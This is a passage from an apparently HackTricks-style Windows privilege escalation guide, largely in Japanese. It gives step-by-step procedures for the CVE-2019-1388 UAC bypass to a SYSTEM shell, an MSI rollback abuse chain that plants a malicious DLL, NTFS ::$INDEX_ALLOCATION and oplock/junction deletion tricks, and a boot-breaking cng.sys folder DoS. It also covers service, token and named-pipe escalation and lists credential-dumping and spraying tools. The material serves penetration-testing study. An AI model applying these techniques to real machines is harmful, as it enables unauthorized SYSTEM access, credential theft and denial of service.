1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## 管理者の Medium から High への Integrity Level / UAC Bypass

Integrity Levels について学ぶには、こちらを読んでください：


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses について学ぶにはこれを読んでください：**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## 任意フォルダの削除/移動/名前変更 から SYSTEM EoP へ

この手法は [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) で説明されており、exploit code は [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) で入手できます。

攻撃は基本的に Windows Installer の rollback 機能を悪用して、アンインストール時に正当なファイルを悪意あるファイルに置き換えることにあります。これには、攻撃者が `C:\Config.Msi` フォルダをハイジャックするために使用する悪意ある MSI インストーラを作成する必要があります。後で Windows Installer が他の MSI パッケージのアンインストール中に rollback ファイルを格納するためにこのフォルダを使用し、rollback ファイルが改ざんされて悪意あるペイロードを含むようになります。

手法の要約は次のとおりです：

1. Stage 1 – Hijack の準備（`C:\Config.Msi` を空にしておく）

- Step 1: Install the MSI
- Writable なフォルダ（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
- インストーラを **"UAC Compliant"** にマークし、**非管理者ユーザー** が実行できるようにします。
- インストール後、そのファイルに対して **ハンドル** を開いたままにしておきます。

- Step 2: Begin Uninstall
- 同じ `.msi` をアンインストールします。
- アンインストール処理はファイルを `C:\Config.Msi` に移動し、`.rbf` ファイルへリネームして rollback バックアップを作成し始めます。
- ファイルが `C:\Config.Msi\<random>.rbf` になったことを検出するために、`GetFinalPathNameByHandle` を使ってオープンしているファイルハンドルをポーリングします。

- Step 3: Custom Syncing
- `.msi` には次のような **カスタムアンインストールアクション（`SyncOnRbfWritten`）** が含まれます：
  - `.rbf` が書き込まれたことを通知する。
  - その後、アンインストールを続行する前に別のイベントを待機する。

- Step 4: Block Deletion of `.rbf`
- シグナルを受けたら、`FILE_SHARE_DELETE` を指定せずに `.rbf` ファイルを開きます — これによりそのファイルの削除が**防止されます**。
- 続いて逆方向にシグナルを送り、アンインストールを完了させます。
- Windows Installer は `.rbf` を削除できず、すべての内容を削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: Manually Delete `.rbf`
- 攻撃者は手動で `.rbf` ファイルを削除します。
- これで **`C:\Config.Msi` が空** になり、ハイジャックの準備が整います。

> この時点で、`C:\Config.Msi` を削除するために SYSTEM レベルの任意フォルダ削除の脆弱性をトリガーしてください。

2. Stage 2 – Rollback スクリプトを悪意あるものに置き換える

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- 自分で `C:\Config.Msi` フォルダを再作成します。
- 弱い DACL（例: Everyone:F）を設定し、`WRITE_DAC` を持つハンドルを開いたままにします。

- Step 7: Run Another Install
- 再度 `.msi` をインストールします。設定は次の通り：
  - `TARGETDIR`: 書き込み可能な場所
  - `ERROROUT`: 強制失敗を引き起こす変数
- このインストールは再び **rollback** をトリガーするために使われ、`.rbs` と `.rbf` を読み込みます。

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待ち、ファイル名を取得します。

- Step 9: Sync Before Rollback
- `.msi` には次のような **カスタムインストールアクション（`SyncBeforeRollback`）** が含まれます：
  - `.rbs` が作成されたときにイベントをシグナルする。
  - その後、続行する前に待機する。

- Step 10: Reapply Weak ACL
- `.rbs created` イベントを受信した後：
  - Windows Installer は `C:\Config.Msi` に強い ACL を再適用します。
  - しかし、あなたは `WRITE_DAC` を持つハンドルを開いたままにしているため、**再度弱い ACL を適用し直す** ことができます。

> ACL は **ハンドルオープン時にのみ適用される** ため、フォルダへの書き込みは可能です。

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` ファイルを上書きして、Windows に次を行わせる **偽の rollback スクリプト** を置きます：
  - あなたの `.rbf`（悪意ある DLL）を **特権的な場所**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元するよう指示する。
  - SYSTEM レベルのペイロード DLL を含む偽の `.rbf` を置く。

- Step 12: Trigger the Rollback
- シンクイベントをシグナルしてインストーラを再開させます。
- 既知のポイントでインストールを意図的に失敗させる **type 19 カスタムアクション（`ErrorOut`）** が設定されています。
- これにより **rollback が開始されます**。

- Step 13: SYSTEM Installs Your DLL
- Windows Installer はあなたの悪意ある `.rbs` を読み込みます。
- あなたの `.rbf` DLL をターゲット場所にコピーします。
- これで **SYSTEM がロードするパスに悪意ある DLL が置かれます**。

- Final Step: Execute SYSTEM Code
- `osk.exe` のような信頼されている **auto-elevated バイナリ** を実行し、ハイジャックした DLL をロードさせます。
- ボン：あなたのコードが **SYSTEM として実行されます**。

### 任意ファイルの削除/移動/名前変更 から SYSTEM EoP へ

主要な MSI rollback 手法（上記）は、`C:\Config.Msi` のような**フォルダ全体を削除できる**ことを前提としています。しかし、もしあなたの脆弱性が **任意のファイル削除** のみを許す場合はどうなるでしょうか？

NTFS の内部構造を利用できます：すべてのフォルダには次のような名前の隠し代替データストリームがあります：
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームはフォルダの**インデックスメタデータ**を格納します。

したがって、フォルダの**`::$INDEX_ALLOCATION` ストリームを削除すると**、NTFS はファイルシステムから**フォルダ全体を削除します**。

この操作は、次のような標準的なファイル削除 API を使用して行えます:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼び出していても、実際には **フォルダ自体を削除する**。

### フォルダ内容の削除から SYSTEM EoP へ
もしあなたのプリミティブが任意のファイル/フォルダを削除することを許さないが、**攻撃者が制御するフォルダの *内容* の削除**は許す場合はどうするか？

1. Step 1: Setup a bait folder and file
- 作成: `C:\temp\folder1`
- その中に: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- oplock は、特権プロセスが `file1.txt` を削除しようとしたときに **実行を一時停止** させる。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. ステップ 3: SYSTEM プロセスをトリガーする (例: `SilentCleanup`)
- このプロセスはフォルダ（例: `%TEMP%`）をスキャンし、その中身を削除しようとします。
- `file1.txt` に到達すると、**oplock triggers** が発生して制御があなたのコールバックに渡されます。

4. ステップ 4: oplock コールバック内で — 削除をリダイレクトする

- オプション A: `file1.txt` を別の場所に移動する
- これは oplock を解除せずに `folder1` を空にします。
- `file1.txt` を直接削除しないでください — そうすると oplock が早期に解除されます。

- オプション B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダのメタデータを格納する NTFS 内部ストリームを狙っており — それを削除するとフォルダ自体が削除されます。

5. ステップ5: Release the oplock
- SYSTEM プロセスは処理を続け、`file1.txt` を削除しようとします。
- しかし今は、junction + symlink のため、実際に削除しているのは:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除される。

### 任意のフォルダ作成から永続的なDoSへ

プリミティブを悪用して、**create an arbitrary folder as SYSTEM/admin** を実行します — たとえ **you can’t write files** や **set weak permissions** であっても。

**folder**（ファイルではなく）を **critical Windows driver** の名前で作成します。例:
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` カーネルモードドライバに対応します。
- もしそれを **フォルダとして事前に作成しておく** と、Windows は起動時に実際のドライバを読み込めなくなります。
- その後、Windows は起動時に `cng.sys` を読み込もうとします。
- フォルダを検出すると、**実際のドライバを解決できず**、**クラッシュまたは起動が停止**します。
- 外部からの介入（例: ブート修復やディスクアクセス）がない限り、**フォールバックはなく**、**復旧もできません**。


## **High Integrity から System へ**

### **新しいサービス**

If you are already running on a High Integrity process, the **SYSTEM へのパス** can be easy just **新しいサービスを作成して実行するだけ**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービスバイナリを作成する際は、それが有効なサービスであるか、あるいは無効なサービスの場合でも必要な処理を速やかに実行することを確認してください。無効なサービスだと20秒で強制終了されます。

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**参照できます** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

これらのトークン権限を持っている場合（おそらく既に High Integrity プロセスで見つかることが多いです）、SeDebug 権限で（保護されたプロセスを除き）ほとんど任意のプロセスを**開くことができ**、そのプロセスのトークンを**コピー**し、そのトークンで**任意のプロセスを作成**できます。\
この手法では通常、すべてのトークン権限を持って動作している SYSTEM プロセスを選択します（はい、すべてのトークン権限を持たない SYSTEM プロセスも存在します）。\
**参照できます** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

この手法は meterpreter が `getsystem` で権限昇格する際に使用されます。手法は、**パイプを作成し、そのパイプに書き込むためにサービスを作成／悪用する**、というものです。すると、**`SeImpersonate`** 権限を使ってパイプを作成した**サーバー**は、パイプのクライアント（サービス）のトークンを**インパーソネート**でき、SYSTEM 権限を取得できます。\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

SYSTEM として動作している **process** に読み込まれる dll を**hijack**できれば、その権限で任意のコードを実行できます。したがって Dll Hijacking はこの種の権限昇格にも有用であり、さらに high integrity プロセスからははるかに**達成しやすい**です。これは high integrity プロセスが dll をロードするフォルダに対する**書き込み権限**を持っているためです。\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## 追加情報

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windows のローカル権限昇格ベクターを探すための最良のツール：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスや機密ファイルをチェックします（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの可能性のある設定ミスをチェックし情報を収集します（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスをチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, および RDP の保存されたセッション情報を抽出します。ローカルでは -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から資格情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメインに対してスプレーします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell 製の ADIDNS/LLMNR/mDNS/NBNS スプーファー兼 man-in-the-middle ツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な Windows の privesc 列挙**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 既知の権限昇格脆弱性を検索します（Watson により非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(管理者権限が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の権限昇格脆弱性を検索します（VisualStudio でのコンパイルが必要）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 設定ミスを探してホストを列挙します（privesc ツールというより情報収集ツール）。コンパイルが必要（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)）。\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くのソフトウェアから資格情報を抽出します（GitHub にプリコンパイル済みの exe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp を C# に移植したもの**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 設定ミスをチェックします（実行可能ファイルは GitHub にプリコンパイル済み）。推奨しません。Win10 ではあまりうまく動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な設定ミスをチェックします（Python 由来の exe）。推奨しません。Win10 ではうまく動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿をベースに作成されたツール（正常に動作するには accesschk を必要としませんが、使用可能です）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み取り、動作するエクスプロイトを推奨します（ローカル Python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み取り、動作するエクスプロイトを推奨します（ローカル Python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

プロジェクトは正しいバージョンの .NET を使用してコンパイルする必要があります（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている .NET のバージョンを確認するには、次のようにします：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考文献

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Silver Foxを追う: Kernel Shadowsにおける猫と鼠](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
